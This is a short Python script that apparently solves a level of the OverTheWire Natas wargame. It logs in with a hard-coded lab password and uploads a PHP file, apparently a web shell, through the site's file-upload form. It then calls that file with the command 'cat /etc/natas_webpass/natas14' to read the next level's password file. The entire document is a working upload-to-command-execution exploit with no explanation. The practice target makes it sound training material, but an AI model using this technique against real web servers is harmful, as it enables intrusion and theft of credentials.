import requests
import re

username = 'natas13'
password = 'lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9'

url = 'http://%s.natas.labs.overthewire.org/'%username

session = requests.Session()
response = session.post(url , files={"uploadedfile" : open('pwd_script.php','rb') } , data = {"filename" : "pwd_script.php" , "MAX_FILE_SIZE" : "1000"}, auth=(username,password))
rand_name = re.findall('"upload/(.*).php"',response.text)[0] # upload/3buos7gfom.php
response = session.get(url + 'upload/'+rand_name+'.php?pwd=cat /etc/natas_webpass/natas14' , auth =(username,password))
content = response.text
print(content)

